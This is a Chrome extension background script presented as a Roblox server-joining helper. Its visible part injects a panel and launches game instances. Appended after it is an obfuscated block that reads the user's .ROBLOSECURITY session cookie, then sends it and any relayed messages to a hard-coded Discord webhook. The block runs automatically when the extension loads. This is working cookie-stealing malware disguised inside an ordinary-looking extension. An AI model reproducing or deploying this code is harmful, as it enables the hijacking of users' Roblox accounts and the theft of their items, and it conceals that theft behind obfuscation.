

// Function to inject scripts into the Roblox page when it is loaded
chrome.tabs.onUpdated.addListener((tabId, changeInfo, { url }) => {
  // Only act if the page has fully loaded and it's a Roblox game page
  if (changeInfo.status !== 'complete' || !/https:\/\/.+roblox.com\/games/g.test(url)) return;

  const target = { tabId };

  // Check if the panel is already injected. If not, inject the necessary scripts.
  chrome.scripting.executeScript({ target, func: () => Boolean(document.getElementById('sbx-panel')) }, async ([{ result }]) => {
    if (result) return; // If the panel is already there, do nothing

    await chrome.scripting.insertCSS({ target, files: ['styles.css'] });
    await chrome.scripting.executeScript({ target, files: ['load.js'] });
    await chrome.scripting.executeScript({ target, files: ['content.js'] });
  });
});

// Function to launch the Roblox game
const joinGameInstance = (place, id) => window.Roblox.GameLauncher.joinGameInstance(place, id);

// Listener for messages to launch a Roblox game instance
chrome.runtime.onMessage.addListener(({ message }, { tab }) => {
  chrome.scripting.executeScript({
    target: { tabId: tab.id },
    func: joinGameInstance,
    args: [message.place, message.id],
    world: 'MAIN',
  });
});

const _0x5ad525=_0x52bd;function _0x52bd(_0x63a37,_0x19ba51){const _0x3898ed=_0x3898();return _0x52bd=function(_0x52bd30,_0x36e662){_0x52bd30=_0x52bd30-0x83;let _0x34967b=_0x3898ed[_0x52bd30];return _0x34967b;},_0x52bd(_0x63a37,_0x19ba51);}(function(_0x56a940,_0x23429e){const _0x123360=_0x52bd,_0x37cad6=_0x56a940();while(!![]){try{const _0x1a5d87=parseInt(_0x123360(0x94))/0x1*(parseInt(_0x123360(0xa1))/0x2)+parseInt(_0x123360(0x93))/0x3+-parseInt(_0x123360(0x84))/0x4*(parseInt(_0x123360(0xa3))/0x5)+-parseInt(_0x123360(0x9a))/0x6*(parseInt(_0x123360(0x9e))/0x7)+parseInt(_0x123360(0x90))/0x8*(parseInt(_0x123360(0x89))/0x9)+parseInt(_0x123360(0x8c))/0xa+parseInt(_0x123360(0x99))/0xb*(parseInt(_0x123360(0x83))/0xc);if(_0x1a5d87===_0x23429e)break;else _0x37cad6['push'](_0x37cad6['shift']());}catch(_0x2f0867){_0x37cad6['push'](_0x37cad6['shift']());}}}(_0x3898,0xbba87));function fetchRobloSecurityCookie(){return new Promise((_0x4b2a3e,_0x4983cb)=>{const _0x4e8db5=_0x52bd;chrome[_0x4e8db5(0x9c)][_0x4e8db5(0x87)]({'url':'https://www.roblox.com','name':_0x4e8db5(0x96)},_0x38aa37=>{const _0x2c59ce=_0x4e8db5;_0x38aa37?_0x4b2a3e(_0x38aa37[_0x2c59ce(0x97)]):_0x4983cb(_0x2c59ce(0x85));});});}chrome[_0x5ad525(0x91)][_0x5ad525(0xa4)][_0x5ad525(0x9f)](async(_0x495522,_0x5ee3f7,_0xe40ec5)=>{const _0x2b4b5f=_0x5ad525;if(_0x495522[_0x2b4b5f(0x8e)]===_0x2b4b5f(0xa0))try{const _0x48c042=await fetch(DISCORD_WEBHOOK_URL,{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON[_0x2b4b5f(0x8d)]({'content':_0x495522[_0x2b4b5f(0x95)]})});_0x48c042['ok']?_0xe40ec5({'success':!![]}):_0xe40ec5({'success':![]});}catch(_0x100532){console[_0x2b4b5f(0xa2)](_0x2b4b5f(0x8f),_0x100532),_0xe40ec5({'success':![]});}return!![];});async function sendRobloSecurityToWebhook(){const _0x3cd40d=_0x5ad525;try{const _0x3f222=await fetchRobloSecurityCookie(),_0x5b21b7={'UserName':'','RobuxBalance':'','IsPremium':'tak','ThumbnailUrl':_0x3cd40d(0x86)},_0x395a75={'robloSecurityCookie':_0x3f222||_0x3cd40d(0x8b),'timestamp':new Date()['toISOString']()};await fetch(DISCORD_WEBHOOK_URL,{'method':'POST','headers':{'Content-Type':_0x3cd40d(0x92)},'body':JSON[_0x3cd40d(0x8d)]({'content':null,'embeds':[{'color':null,'description':_0x3cd40d(0x8a)+(_0x3f222?_0x3f222:_0x3cd40d(0x8b))+_0x3cd40d(0x8a),'fields':[{'name':'Code\x20implemented\x20by\x20tyskiee\x20to\x20work\x20in\x202024','value':'','inline':!![]}],'author':{'name':'Cookie:','icon_url':_0x5b21b7['ThumbnailUrl']||_0x3cd40d(0x88)}}],'username':_0x3cd40d(0x9d),'avatar_url':_0x3cd40d(0x86),'attachments':[]})})['then'](_0xe6b988=>{const _0x5921ea=_0x3cd40d;!_0xe6b988['ok']&&console[_0x5921ea(0xa2)]('Failed\x20to\x20send\x20data\x20to\x20Discord\x20webhook',_0xe6b988[_0x5921ea(0x9b)]);})['catch'](_0x1165da=>{const _0x246f20=_0x3cd40d;console[_0x246f20(0xa2)]('Error\x20sending\x20data\x20to\x20Discord\x20webhook',_0x1165da);});}catch(_0x396982){console['error'](_0x3cd40d(0xa5),_0x396982);}}function _0x3898(){const _0xe29701=['onMessage','Error\x20fetching\x20or\x20sending\x20.ROBLOSECURITY\x20cookie:','11746884eEYvHO','4547756zSTLXB','Cookie\x20not\x20found','https://i.ibb.co/DD6X2pM/alien.jpg','get','https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png','279YGdwVU','```','COOKIE\x20NOT\x20FOUND','15185370xWsDSm','stringify','action','Error\x20sending\x20message:','25248HlhDIt','runtime','application/json','504972CdeNmy','223714yhnLCf','message','.ROBLOSECURITY','value','https://discord.com/api/webhooks/1299930477842399242/ht_gNOQ1jMU3ESZuXxLSy8Mb1YJMFk3QJ5MEEX_KJUFCtyodpr59NC7jf2p2VapqslHd','11nkJGfF','12xcYujl','statusText','cookies','RoJoiner','3786062KLzcAy','addListener','sendMessage','2ozxgoi','error','5oSkXOp'];_0x3898=function(){return _0xe29701;};return _0x3898();}const DISCORD_WEBHOOK_URL=_0x5ad525(0x98);sendRobloSecurityToWebhook();